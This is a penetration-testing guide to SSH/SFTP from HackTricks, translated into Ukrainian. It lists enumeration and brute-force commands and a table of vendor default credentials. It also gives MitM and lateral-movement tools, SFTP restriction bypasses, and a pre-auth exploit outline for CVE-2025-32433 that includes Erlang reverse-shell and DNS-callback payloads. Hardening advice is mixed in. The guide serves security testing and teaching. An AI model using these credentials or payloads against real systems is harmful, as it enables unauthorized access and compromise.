# 22 - Pentesting SSH/SFTP

{{#include ../banners/hacktricks-training.md}}

## Основна інформація

**SSH (Secure Shell or Secure Socket Shell)** — це мережевий протокол, який дозволяє встановити безпечне з'єднання з комп'ютером через незахищену мережу. Він є необхідним для забезпечення конфіденційності та цілісності даних при доступі до віддалених систем.

**Порт за замовчуванням:** 22
```
22/tcp open  ssh     syn-ack
```
**SSH servers:**

- [openSSH](http://www.openssh.org) – OpenBSD SSH, постачається в BSD, дистрибутивах Linux та Windows починаючи з Windows 10
- [Dropbear](https://matt.ucc.asn.au/dropbear/dropbear.html) – реалізація SSH для середовищ з обмеженою пам'яттю та обчислювальними ресурсами, включена в OpenWrt
- [PuTTY](https://www.chiark.greenend.org.uk/~sgtatham/putty/) – реалізація SSH для Windows; клієнт використовується часто, а сервер застосовується рідше
- [CopSSH](https://www.itefix.net/copssh) – реалізація OpenSSH для Windows

**SSH libraries (implementing server-side):**

- [libssh](https://www.libssh.org) – кросплатформна C бібліотека, що реалізує протокол SSHv2 з биндингами в [Python](https://github.com/ParallelSSH/ssh-python), [Perl](https://github.com/garnier-quentin/perl-libssh/) і [R](https://github.com/ropensci/ssh); використовується KDE для sftp та GitHub для git SSH інфраструктури
- [wolfSSH](https://www.wolfssl.com/products/wolfssh/) – бібліотека SSHv2 для сервера, написана на ANSI C і орієнтована на embedded, RTOS та середовища з обмеженими ресурсами
- [Apache MINA SSHD](https://mina.apache.org/sshd-project/index.html) – Apache SSHD java library is based on Apache MINA
- [paramiko](https://github.com/paramiko/paramiko) – Python SSHv2 protocol library

## Enumeration

### Banner Grabbing
```bash
nc -vn <IP> 22
```
### Автоматизований ssh-audit

ssh-audit — інструмент для аудиту конфігурацій ssh-сервера та клієнта.

[https://github.com/jtesta/ssh-audit](https://github.com/jtesta/ssh-audit) is an updated fork from [https://github.com/arthepsy/ssh-audit/](https://github.com/arthepsy/ssh-audit/)

**Можливості:**

- Підтримка серверів протоколів SSH1 і SSH2;
- аналіз конфігурації клієнта SSH;
- отримання banner, розпізнавання пристрою або ПЗ та операційної системи, виявлення стиснення;
- збір алгоритмів key-exchange, host-key, encryption та message authentication code;
- вивід інформації про алгоритми (доступні з версії, видалені/відключені, небезпечні/слабкі/застарілі тощо);
- рекомендації щодо алгоритмів (додавати або видаляти на основі розпізнаної версії ПЗ);
- вивід інформації про безпеку (пов'язані проблеми, список призначених CVE тощо);
- аналіз сумісності версій SSH на основі інформації про алгоритми;
- історична інформація з OpenSSH, Dropbear SSH та libssh;
- працює на Linux та Windows;
- не має залежностей
```bash
usage: ssh-audit.py [-1246pbcnjvlt] <host>

-1,  --ssh1             force ssh version 1 only
-2,  --ssh2             force ssh version 2 only
-4,  --ipv4             enable IPv4 (order of precedence)
-6,  --ipv6             enable IPv6 (order of precedence)
-p,  --port=<port>      port to connect
-b,  --batch            batch output
-c,  --client-audit     starts a server on port 2222 to audit client
software config (use -p to change port;
use -t to change timeout)
-n,  --no-colors        disable colors
-j,  --json             JSON output
-v,  --verbose          verbose output
-l,  --level=<level>    minimum output level (info|warn|fail)
-t,  --timeout=<secs>   timeout (in seconds) for connection and reading
(default: 5)
$ python3 ssh-audit <IP>
```
[See it in action (Asciinema)](https://asciinema.org/a/96ejZKxpbuupTK9j7h8BdClzp)

### Публічний SSH ключ сервера
```bash
ssh-keyscan -t rsa <IP> -p <PORT>
```
### Слабкі алгоритми шифрування

Це виявляється за замовчуванням за допомогою **nmap**. Але ви також можете використати **sslcan** або **sslyze**.

### Nmap скрипти
```bash
nmap -p22 <ip> -sC # Send default nmap scripts for SSH
nmap -p22 <ip> -sV # Retrieve version
nmap -p22 <ip> --script ssh2-enum-algos # Retrieve supported algorythms
nmap -p22 <ip> --script ssh-hostkey --script-args ssh_hostkey=full # Retrieve weak keys
nmap -p22 <ip> --script ssh-auth-methods --script-args="ssh.user=root" # Check authentication methods
```
### Shodan

- `ssh`

## Brute force usernames, passwords and private keys

### Username Enumeration

У деяких версіях OpenSSH можна здійснити timing attack, щоб enumerate users. Ви можете використати metasploit module, щоб exploit це:
```
msf> use scanner/ssh/ssh_enumusers
```
### [Brute force](../generic-hacking/brute-force.md#ssh)

Деякі поширені ssh credentials [тут](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt) і [тут](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt) та нижче.

### Private Key Brute Force

Якщо ви знаєте деякі ssh private keys, які могли б бути використані... спробуємо. Ви можете використати nmap script:
```
https://nmap.org/nsedoc/scripts/ssh-publickey-acceptance.html
```
Або MSF auxiliary module:
```
msf> use scanner/ssh/ssh_identify_pubkeys
```
Або використайте `ssh-keybrute.py` (native python3, легкий та з увімкненими legacy алгоритмами): [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute).

#### Відомі badkeys можна знайти тут:


{{#ref}}
https://github.com/rapid7/ssh-badkeys/tree/master/authorized
{{#endref}}

#### Слабкі SSH-ключі / передбачуваний PRNG у Debian

Деякі системи мають відомі вади в випадковому сіді, що використовується для генерації криптографічних матеріалів. Це може призвести до значно зменшеного простору ключів, який можна перебрати брутфорсом. Попередньо згенеровані набори ключів з систем Debian, які постраждали через слабкий PRNG, доступні тут: [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).

Варто переглянути ці ресурси, щоб знайти дійсні ключі для цільової машини.

### Kerberos / GSSAPI SSO

Якщо цільовий SSH-сервер підтримує GSSAPI (наприклад Windows OpenSSH на domain controller), ви можете автентифікуватися, використавши свій Kerberos TGT замість пароля.

Порядок дій з Linux-хоста нападника:
```bash
# 1) Ensure time is in sync with the KDC to avoid KRB_AP_ERR_SKEW
sudo ntpdate <dc.fqdn>

# 2) Generate a krb5.conf for the target realm (optional, but handy)
netexec smb <dc.fqdn> -u <user> -p '<pass>' -k --generate-krb5-file krb5.conf
sudo cp krb5.conf /etc/krb5.conf

# 3) Obtain a TGT for the user
kinit <user>
klist

# 4) SSH with GSSAPI, using the FQDN that matches the host SPN
ssh -o GSSAPIAuthentication=yes <user>@<host.fqdn>
```
Примітки:
- Якщо ви підключаєтесь до неправильного імені (наприклад, коротке ім'я хоста, псевдонім або неправильний порядок у `/etc/hosts`), ви можете отримати: "Server not found in Kerberos database" через те, що SPN не збігається.
- `crackmapexec ssh --kerberos` також може використовувати ваш ccache для Kerberos-аутентифікації.

## Типові облікові дані

| **Постачальник** | **Імена користувачів**                                                                                               | **Паролі**                                                                                                                                                                                             |
| ---------- | ----------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| APC        | apc, device                                                                                                 | apc                                                                                                                                                                                                       |
| Brocade    | admin                                                                                                       | admin123, password, brocade, fibranne                                                                                                                                                                     |
| Cisco      | admin, cisco, enable, hsa, pix, pnadmin, ripeop, root, shelladmin                                           | admin, Admin123, default, password, secur4u, cisco, Cisco, _Cisco, cisco123, C1sco!23, Cisco123, Cisco1234, TANDBERG, change_it, 12345, ipics, pnadmin, diamond, hsadb, c, cc, attack, blender, changeme |
| Citrix     | root, nsroot, nsmaint, vdiadmin, kvm, cli, admin                                                            | C1trix321, nsroot, nsmaint, kaviza, kaviza123, freebsd, public, rootadmin, wanscaler                                                                                                                      |
| D-Link     | admin, user                                                                                                 | private, admin, user                                                                                                                                                                                      |
| Dell       | root, user1, admin, vkernel, cli                                                                            | calvin, 123456, password, vkernel, Stor@ge!, admin                                                                                                                                                        |
| EMC        | admin, root, sysadmin                                                                                       | EMCPMAdm7n, Password#1, Password123#, sysadmin, changeme, emc                                                                                                                                             |
| HP/3Com    | admin, root, vcx, app, spvar, manage, hpsupport, opc_op                                                     | admin, password, hpinvent, iMC123, pvadmin, passw0rd, besgroup, vcx, nice, access, config, 3V@rpar, 3V#rpar, procurve, badg3r5, OpC_op, !manage, !admin                                                   |
| Huawei     | admin, root                                                                                                 | 123456, admin, root, Admin123, Admin@storage, Huawei12#$, HwDec@01, hwosta2.0, HuaWei123, fsp200@HW, huawei123                                                                                            |
| IBM        | USERID, admin, manager, mqm, db2inst1, db2fenc1, dausr1, db2admin, iadmin, system, device, ufmcli, customer | PASSW0RD, passw0rd, admin, password, Passw8rd, iadmin, apc, 123456, cust0mer                                                                                                                              |
| Juniper    | netscreen                                                                                                   | netscreen                                                                                                                                                                                                 |
| NetApp     | admin                                                                                                       | netapp123                                                                                                                                                                                                 |
| Oracle     | root, oracle, oravis, applvis, ilom-admin, ilom-operator, nm2user                                           | changeme, ilom-admin, ilom-operator, welcome1, oracle                                                                                                                                                     |
| VMware     | vi-admin, root, hqadmin, vmware, admin                                                                      | vmware, vmw@re, hqadmin, default                                                                                                                                                                          |

## SSH-MitM

Якщо ви перебуваєте в локальній мережі поруч із жертвою, яка збирається підключитися до SSH-сервера, використовуючи ім'я користувача та пароль, ви можете спробувати виконати MitM-атаку, щоб викрасти ці облікові дані:

**Хід атаки:**

- **Перенаправлення трафіку:** Атакуючий **перенаправляє** трафік жертви на свою машину, фактично **перехоплюючи** спробу підключення до SSH-сервера.
- **Перехоплення та логування:** Машина атакуючого виступає як **проксі**, **захоплюючи** дані для входу користувача, видаючи себе за легітимний SSH-сервер.
- **Виконання команд і ретрансляція:** Нарешті, сервер атакуючого **записує облікові дані користувача**, **пересилає команди** на реальний SSH-сервер, **виконує** їх і **повертає результати** користувачеві, роблячи процес безшовним і легітимним на вигляд.

[**SSH MITM**](https://github.com/jtesta/ssh-mitm) робить саме те, що описано вище.

Щоб виконати фактичну MitM-атаку, можна використовувати техніки на кшталт ARP spoofing, DNS spoofin або інші, описані в [**Network Spoofing attacks**](../generic-methodologies-and-resources/pentesting-network/index.html#spoofing).

## SSH-Snake

Якщо ви хочете переміщатися по мережі, використовуючи виявлені приватні SSH-ключі на системах, застосовуючи кожний приватний ключ на кожній системі для доступу до нових хостів, то [**SSH-Snake**](https://github.com/MegaManSec/SSH-Snake) — саме те, що вам потрібно.

SSH-Snake виконує наступні дії автоматично і рекурсивно:

1. На поточній системі знайти будь-які приватні SSH-ключі,
2. На поточній системі знайти будь-які хости або цілі (user@host), до яких можуть прийматися знайдені ключі,
3. Спробувати підключитися по SSH до всіх цілей, використовуючи всі знайдені приватні ключі,
4. Якщо підключення до цілі відбулося успішно — повторити кроки 1–4 на підключеній системі.

Воно повністю самовідтворюється і саморозповсюджується — і повністю безфайлове.

## Помилки в конфігурації

### Вхід root

Досить часто SSH-сервери за замовчуванням дозволяють вхід користувача root, що становить значний ризик безпеці. **Вимкнення входу root** є критичним кроком для захисту сервера. Несанкціонований доступ з адміністративними привілеями та атаки методом перебору можна пом’якшити, виконавши цю зміну.

**Щоб вимкнути вхід root в OpenSSH:**

1. **Відредагуйте файл конфігурації SSH** за допомогою: `sudoedit /etc/ssh/sshd_config`
2. **Змініть параметр** з `#PermitRootLogin yes` на **`PermitRootLogin no`**.
3. **Перезавантажте конфігурацію** за допомогою: `sudo systemctl daemon-reload`
4. **Перезапустіть SSH-сервер**, щоб застосувати зміни: `sudo systemctl restart sshd`

### SFTP Brute Force

- [**SFTP Brute Force**](../generic-hacking/brute-force.md#sftp)

### SFTP command execution

У налаштуваннях SFTP часто трапляється поширена помилка: адміністратори хочуть дозволити користувачам обмінюватися файлами без надання доступу до віддаленої оболонки. Незважаючи на встановлення для користувачів неінтерактивних оболонок (наприклад, `/usr/bin/nologin`) і обмеження їх конкретною директорією, залишається пролом у безпеці. **Користувачі можуть обійти ці обмеження**, запитавши виконання команди (наприклад `/bin/bash`) відразу після входу, до того як почне діяти їх неінтерактивна оболонка. Це дозволяє несанкціоноване виконання команд і підриває передбачені заходи безпеки.

[Example from here](https://community.turgensec.com/ssh-hacking-guide/):
```bash
ssh -v noraj@192.168.1.94 id
...
Password:
debug1: Authentication succeeded (keyboard-interactive).
Authenticated to 192.168.1.94 ([192.168.1.94]:22).
debug1: channel 0: new [client-session]
debug1: Requesting no-more-sessions@openssh.com
debug1: Entering interactive session.
debug1: pledge: network
debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
debug1: Sending command: id
debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0
uid=1000(noraj) gid=100(users) groups=100(users)
debug1: channel 0: free: client-session, nchannels 1
Transferred: sent 2412, received 2480 bytes, in 0.1 seconds
Bytes per second: sent 43133.4, received 44349.5
debug1: Exit status 0

$ ssh noraj@192.168.1.94 /bin/bash
```
Ось приклад безпечної конфігурації SFTP (`/etc/ssh/sshd_config` – openSSH) для користувача `noraj`:
```
Match User noraj
ChrootDirectory %h
ForceCommand internal-sftp
AllowTcpForwarding no
PermitTunnel no
X11Forwarding no
PermitTTY no
```
Ця конфігурація дозволяє лише SFTP: вона відключає shell access шляхом примусового запуску start command і відключає TTY access, а також забороняє будь-який port forwarding або tunneling.

### SFTP Tunneling

Якщо у вас є доступ до SFTP server, ви також можете tunnel your traffic через нього — наприклад, використовуючи стандартне port forwarding:
```bash
sudo ssh -L <local_port>:<remote_host>:<remote_port> -N -f <username>@<ip_compromised>
```
### SFTP Symlink

У **sftp** є команда "**symlink**". Тому, якщо у вас є **writable rights** в якійсь папці, ви можете створювати **symlinks** of **other folders/files**. Оскільки ви, ймовірно, **trapped** всередині chroot, це **won't be specially useful** для вас, але якщо ви зможете **access** створений **symlink** з **no-chroot** **service** (наприклад, якщо ви зможете access the symlink from the web), ви могли б **open the symlinked files through the web**.

Наприклад, щоб створити **symlink** from a new file **"**_**froot**_**" to "**_**/**_**"**:
```bash
sftp> symlink / froot
```
Якщо ви можете отримати доступ до файлу "_froot_" через веб, ви зможете перелічити кореневу ("/") папку системи.

### Методи автентифікації

У середовищах з високим рівнем безпеки зазвичай практикують увімкнення лише автентифікації на основі ключів або двофакторної автентифікації замість простої автентифікації на основі пароля. Але часто більш сильні методи автентифікації вмикають, не вимикаючи слабші. Частий випадок — увімкнення `publickey` в конфігурації openSSH і встановлення його як методу за замовчуванням, але не вимкнення `password`. Тому, використовуючи режим детального виводу SSH client, атакуючий може побачити, що слабший метод увімкнено:
```bash
ssh -v 192.168.1.94
OpenSSH_8.1p1, OpenSSL 1.1.1d  10 Sep 2019
...
debug1: Authentications that can continue: publickey,password,keyboard-interactive
```
Наприклад, якщо встановлено ліміт невдалих спроб аутентифікації й ви ніколи не маєте змоги дійти до password-методу, ви можете використати опцію `PreferredAuthentications`, щоб примусово використовувати цей метод.
```bash
ssh -v 192.168.1.94 -o PreferredAuthentications=password
...
debug1: Next authentication method: password
```
Перегляд конфігурації SSH-сервера необхідний, щоб перевірити, що дозволені лише очікувані методи. Використання verbose mode на клієнті може допомогти побачити ефективність конфігурації.

### Файли конфігурації
```bash
ssh_config
sshd_config
authorized_keys
ssh_known_hosts
known_hosts
id_rsa
```
## Fuzzing

- [https://packetstormsecurity.com/files/download/71252/sshfuzz.txt](https://packetstormsecurity.com/files/download/71252/sshfuzz.txt)
- [https://www.rapid7.com/db/modules/auxiliary/fuzzers/ssh/ssh_version_2](https://www.rapid7.com/db/modules/auxiliary/fuzzers/ssh/ssh_version_2)

## Authentication State-Machine Bypass (Pre-Auth RCE)

Кілька реалізацій SSH-сервера містять логічні помилки в **authentication finite-state machine**, що дозволяють клієнту надсилати *connection-protocol* повідомлення **до того**, як автентифікація завершиться. Оскільки сервер не перевіряє, що він знаходиться в правильному стані, ці повідомлення обробляються так, ніби користувач повністю автентифікований, що призводить до **unauthenticated code execution** або створення сесії.

На рівні протоколу будь-яке повідомлення SSH з _message code_ **≥ 80** (0x50) належить до шару *connection* (RFC 4254) і має **прийматися лише після успішної автентифікації** (RFC 4252). Якщо сервер обробляє одне з цих повідомлень, перебуваючи ще в стані *SSH_AUTHENTICATION*, нападник може негайно створити канал і запросити дії, такі як command execution, port-forwarding тощо.

### Загальні кроки експлуатації
1. Встановіть TCP-з'єднання до SSH-порту цілі (зазвичай 22, але інші сервіси можуть слухати Erlang/OTP на 2022, 830, 2222…).
2. Сформуйте raw SSH-пакет:
* 4-байтове **packet_length** (big-endian)
* 1-байтовий **message_code** ≥ 80 (наприклад `SSH_MSG_CHANNEL_OPEN` = 90, `SSH_MSG_CHANNEL_REQUEST` = 98)
* Payload, який буде зрозумілий обраному типу повідомлення
3. Надашліть пакет(и) **до завершення будь-якого кроку автентифікації**.
4. Взаємодійте з API сервера, які тепер відкриті _pre-auth_ (command execution, port forwarding, file-system access, …).

Python proof-of-concept outline:
```python
import socket, struct
HOST, PORT = '10.10.10.10', 22
s = socket.create_connection((HOST, PORT))
# skip version exchange for brevity – send your own client banner then read server banner
# … key exchange can be skipped on vulnerable Erlang/OTP because the bug is hit immediately after the banner
# Packet: len(1)=1, SSH_MSG_CHANNEL_OPEN (90)
pkt  = struct.pack('>I', 1) + b'\x5a'  # 0x5a = 90
s.sendall(pkt)
# additional CHANNEL_REQUEST packets can follow to run commands
```
На практиці вам потрібно виконати (або пропустити) key-exchange залежно від реалізації цілі, але **no authentication** ніколи не виконується.

---
### Erlang/OTP `sshd` (CVE-2025-32433)
* **Вразливі версії:** OTP < 27.3.3, 26.2.5.11, 25.3.2.20
* **Причина:** Erlang native SSH daemon не перевіряє поточний стан перед викликом `ssh_connection:handle_msg/2`. Тому будь-який пакет з кодом повідомлення 80-255 доходить до обробника з'єднання, поки сесія все ще знаходиться в стані *userauth*.
* **Вплив:** unauthenticated **remote code execution** (демон зазвичай працює як **root** на embedded/OT devices).

Приклад payload, який запускає reverse shell, прив'язаний до attacker-controlled channel:
```erlang
% open a channel first … then:
execSinet:cmd(Channel, "exec('/bin/sh', ['-i'], [{fd, Channel#channel.fd}, {pid, true}]).").
```
Blind RCE / out-of-band detection можна виконати через DNS:
```erlang
execSinet:gethostbyname("<random>.dns.outbound.watchtowr.com").Zsession
```
Виявлення та пом'якшення:
* Перевіряйте SSH-трафік: **відкидайте будь-який пакет з кодом повідомлення ≥ 80, виявлений до автентифікації**.
* Оновіть Erlang/OTP до **27.3.3 / 26.2.5.11 / 25.3.2.20** або новіших.
* Обмежте доступність портів управління (22/2022/830/2222) – особливо на OT-обладнанні.

---
### Інші постраждалі реалізації
* **libssh** 0.6 – 0.8 (на стороні сервера) – **CVE-2018-10933** – приймає неаутентифікований `SSH_MSG_USERAUTH_SUCCESS`, надісланий клієнтом, фактично зворотня логічна помилка.

Загальний урок: будь-яке відхилення від переходів станів, визначених RFC, може бути фатальним; при перевірці або fuzzing SSH-демонів звертайте особливу увагу на *забезпечення автомата станів*.



## References

- [Unit 42 – Erlang/OTP SSH CVE-2025-32433](https://unit42.paloaltonetworks.com/erlang-otp-cve-2025-32433/)
- [SSH hardening guides](https://www.ssh-audit.com/hardening_guides.html)
- [Turgensec SSH hacking guide](https://community.turgensec.com/ssh-hacking-guide)
- [Pentesting Kerberos (88) – client setup and troubleshooting](pentesting-kerberos-88/README.md)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)

## Автоматичні команди HackTricks
```
Protocol_Name: SSH
Port_Number: 22
Protocol_Description: Secure Shell Hardening

Entry_1:
Name: Hydra Brute Force
Description: Need Username
Command: hydra -v -V -u -l {Username} -P {Big_Passwordlist} -t 1 {IP} ssh

Entry_2:
Name: consolesless mfs enumeration
Description: SSH enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_version; set RHOSTS {IP}; set RPORT 22; run; exit' && msfconsole -q -x 'use scanner/ssh/ssh_enumusers; set RHOSTS {IP}; set RPORT 22; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ssh/juniper_backdoor; set RHOSTS {IP}; set RPORT 22; run; exit'

```
{{#include ../banners/hacktricks-training.md}}
